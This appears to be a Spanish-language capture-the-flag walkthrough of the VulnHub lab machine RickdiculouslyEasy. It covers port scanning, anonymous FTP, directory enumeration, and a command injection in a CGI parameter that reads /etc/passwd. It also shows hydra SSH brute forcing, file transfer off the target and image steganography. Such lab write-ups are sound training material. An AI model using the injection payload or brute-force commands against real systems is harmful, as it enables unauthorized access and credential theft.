# Maquina RickdiculouslyEasy - VulnHub

* Nivel : Easy
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 192.168.56.130

## Escaneo de puertos

```bash
sudo nmap -A -sV -O -T4 -p- -Pn 192.168.56.130
```
```bash
Nmap scan report for 192.168.56.130
Host is up (0.00028s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Morty's Website
|_http-server-header: Apache/2.4.27 (Fedora)
9090/tcp  open  http    Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.56.130:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.94SVN%I=7%D=6/16%Time=685023D3%P=x86_64-pc-linux-gnu%r(N
SF:ULL,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204
SF:\.4\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.94SVN%I=7%D=6/16%Time=685023D3%P=x86_64-pc-linux-gnu%
SF:r(NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.94SVN%I=7%D=6/16%Time=685023D9%P=x86_64-pc-linux-gnu%
SF:r(NULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\
SF:.\.\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x2
SF:0reverse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 192.168.56.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.44 seconds
```
El nmap ha encontrado una flag y varios puertos abiertos como el ftp, http en el 80 y 9090 y ssh en el 22 y el 22222.

## FTP

Usare como user y password anonymous, ya que en algunos casos no desactivan este user.

```bash
ftp 192.168.56.130
```
```bash
Connected to 192.168.56.130.
220 (vsFTPd 3.0.3)
Name (192.168.56.130:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56722|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
229 Entering Extended Passive Mode (|||61365|)
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
100% |***************************************************************************|    42       22.74 KiB/s    00:00 ETA
226 Transfer complete.
42 bytes received in 00:00 (15.16 KiB/s)
```
Dentro hay una flag, me la he descargado y la he abierto con cat. La carpeta pub no contiene nada.

## Escaneo de vulnerabilidades web
Usare gobuster para buscar directorios útiles.
```bash
gobuster dir -u http://192.168.56.130 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt,htm
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.130
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,htm,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.hta.php             (Status: 403) [Size: 217]
/.hta.txt             (Status: 403) [Size: 217]
/.hta.htm             (Status: 403) [Size: 217]
/.htaccess            (Status: 403) [Size: 218]
/.htaccess.php        (Status: 403) [Size: 222]
/.htaccess.txt        (Status: 403) [Size: 222]
/.htpasswd            (Status: 403) [Size: 218]
/.htaccess.htm        (Status: 403) [Size: 222]
/.htpasswd.php        (Status: 403) [Size: 222]
/.htpasswd.txt        (Status: 403) [Size: 222]
/.htpasswd.htm        (Status: 403) [Size: 222]
/.htm                 (Status: 403) [Size: 213]
/cgi-bin/.htm         (Status: 403) [Size: 221]
/cgi-bin/             (Status: 403) [Size: 217]
/index.html           (Status: 200) [Size: 326]
/passwords            (Status: 301) [Size: 240] [--> http://192.168.56.130/passwords/]
/robots.txt           (Status: 200) [Size: 126]
/robots.txt           (Status: 200) [Size: 126]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```
El gobuster ha encontrado la ruta passwords y el archivo robots.txt.

En el directorio password hay una flag y el archivo password.html, dentro de este, click derecho view page source y hay un comentario con una contraseña.

## SSH - 1 
```bash
sudo ssh morty@192.168.56.130 -p22222
```
He intentado hacer uso de el user morty porque es el nombre que se repite en la wbe y la contraseña de antes, pero no es de morty.

## Robots.txt

Dentro de la url http://192.168.56.130/robots.txt hay 2 rutas. En la ruta /cgi-bin/tracertool.cgi parece que en este cgi se pueden ejecutar comandos. Ya que al escribir la ip de la maquina, devuelve traceroute. Entonces se puede intentar hacer inyecciones de CGI

```bash
/cgi-bin/tracertool.cgi?ip=192.168.56.130;more+/etc/passwd
```
Esto mostrara el archivo passwd, útil para ver los users del servidor:

```bash
::::::::::::::
/etc/passwd
::::::::::::::
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

```
Hay como posibles candidatos a user : Summer, Morty, RickSanchez. Ya que es típico que tengan la UID del 1000

## SSH - 2

Primero crear un archivo con los users. Y con la herramienta hydra hacer probar por fuerza bruta con la contraseña winter.

```bash
sudo hydra -L users -p winter 192.168.56.130 -t 4 ssh -s 22222
```
```bash
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ssh://192.168.56.130:22222/
[22222][ssh] host: 192.168.56.130   login: Summer   password: winter
1 of 1 target successfully completed, 1 valid password found
```
Con la contraseña y el user. Entrar por ssh.

```bash
ssh Summer@192.168.56.130 -p22222
```
```bash
The authenticity of host '[192.168.56.130]:22222 ([192.168.56.130]:22222)' can't be established.
ED25519 key fingerprint is SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.130]:22222' (ED25519) to the list of known hosts.
Summer@192.168.56.130's password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$
```
ls y hay una flag, el comando cat dibuja un gato, pero se puede usar nano, para leer la flag.

Buscando por carpetas, he encontrado que en el /home/Morty hay 2 archivos. Un zip y una imagen. Entonces abrir un server local en la maquina victima con python para descargar los archivos.
```bash
python3 -m http.server 8000
```
En la maquina atacante 
```bash
wget http://192.168.56.130:8000/Safe_Password.jpg
```
Usar la herramietna binwalk 
```bash
binwalk Safe_Password.jpg
```
```bash
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
192           0xC0            Unix path: /home/Morty/journal.txt.zip. Password: Meeseek

```
Nos da una contraseña para el journal.txt.zip. Entonces un unzip al journal.txt.zip y la contraseña. Y te da otra flag con un codigo.

Dentro de la ruta /home/RickSanchez/RICKS_SAFE hay un archivo safe. Repetir el proceso de abrir un server local con python y pasarnos el safe. Darle permisos de ejecución y ejecutarlo con el codigo que había dentro de la flag anterior. Ya que el mensaje de no poner este codigo te dice que uses argumentos y en el anterior mensaje no para de repetir la palabra safe.







